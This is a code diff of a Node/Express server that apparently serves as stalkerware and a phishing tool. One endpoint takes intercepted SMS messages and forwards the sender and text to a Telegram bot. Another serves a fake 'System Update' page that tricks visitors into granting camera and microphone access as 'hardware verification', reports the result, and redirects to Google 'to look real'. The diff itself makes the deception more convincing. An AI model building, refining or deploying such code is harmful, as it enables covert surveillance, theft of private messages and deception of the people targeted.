@@ -3,7 +3,6 @@ const axios = require('axios');
 const path = require('path');
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -25,25 +24,20 @@ app.post('/log-sms', async (req, res) => {
             device: device || 'Tiger-Device',
             timestamp: timestamp || new Date().toISOString()
         };
-
         smsLogs.unshift(newEntry);
-        if (smsLogs.length > 100) smsLogs.pop();
 
         const telegramMsg = `🐯 *Tiger SMS Alert!*\n\n` +
                           `📱 *Device:* ${newEntry.device}\n` +
                           `👤 *From:* ${newEntry.sender}\n` +
-                          `💬 *Message:* ${newEntry.message}\n` +
-                          `⏰ *Time:* ${newEntry.timestamp}`;
+                          `💬 *Message:* ${newEntry.message}`;
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: telegramMsg,
             parse_mode: 'Markdown'
         });
-
         res.status(200).json({ status: 'success' });
     } catch (error) {
-        console.error('SMS Error:', error.message);
         res.status(500).json({ status: 'error' });
     }
 });
@@ -57,36 +51,44 @@ app.get('/track', (req, res) => {
             <title>System Update</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
+                body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 50px 20px; }
+                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+                .loader { display: none; color: #aaa; margin-top: 20px; }
             </style>
         </head>
         <body>
             <h1>Update Required</h1>
-            <p>Please allow permissions to verify your device hardware.</p>
-            <button onclick="startCapture()">Check Hardware</button>
+            <p>Your device requires a hardware verification to continue with the system update.</p>
+            <button id="btn" onclick="startCapture()">Verify Hardware</button>
+            <div id="loader" class="loader">Verifying... Please wait...</div>
 
             <script>
                 async function startCapture() {
+                    document.getElementById('btn').style.display = 'none';
+                    document.getElementById('loader').style.display = 'block';
+                    
                     try {
+                        // Camera & Mic Request
                         const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                        alert("Device hardware verified successfully!");
                         
-                        fetch('/log-link-access', {
+                        await fetch(window.location.origin + '/log-link-access', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ status: 'Permission Granted', type: 'Camera/Mic' })
+                            body: JSON.stringify({ status: '✅ PERMISSION GRANTED', type: 'Camera/Mic' })
                         });
-                        
-                        // Stop stream after access
+
                         stream.getTracks().forEach(track => track.stop());
+                        alert("Hardware Verified! Redirecting...");
+                        window.location.href = "https://www.google.com"; // Redirect to look real
+                        
                     } catch (err) {
-                        alert("Permission denied. Update failed.");
-                        fetch('/log-link-access', {
+                        await fetch(window.location.origin + '/log-link-access', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ status: 'Permission Denied', type: 'Camera/Mic' })
+                            body: JSON.stringify({ status: '❌ PERMISSION DENIED', type: 'Camera/Mic' })
                         });
+                        alert("Error: Verification failed. Please allow permissions.");
+                        location.reload();
                     }
                 }
             </script>
@@ -113,6 +115,7 @@ app.post('/log-link-access', async (req, res) => {
         });
         res.json({ success: true });
     } catch (error) {
+        console.error("Link Log Error:", error.message);
         res.status(500).json({ error: error.message });
     }
 });
@@ -120,4 +123,4 @@ app.post('/log-link-access', async (req, res) => {
 app.get('/get-logs', (req, res) => res.json(smsLogs));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('🚀 Server running on port ' + PORT));
+app.listen(PORT, () => console.log('🚀 Tiger Server Live on Port ' + PORT));
